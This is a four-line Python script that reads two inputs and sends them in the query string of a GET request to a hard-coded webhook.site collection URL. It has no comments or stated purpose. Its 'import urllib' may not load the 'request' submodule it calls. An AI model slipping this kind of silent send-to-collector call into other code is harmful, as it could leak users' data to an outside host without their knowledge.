import urllib
a = input()
b = input()

urllib.request.urlopen("https://webhook.site/d3181d45-a576-40b8-8b9d-d21e70bd5289?" + a.replace(" ", "+") + "&" + b.replace(" ", "+") )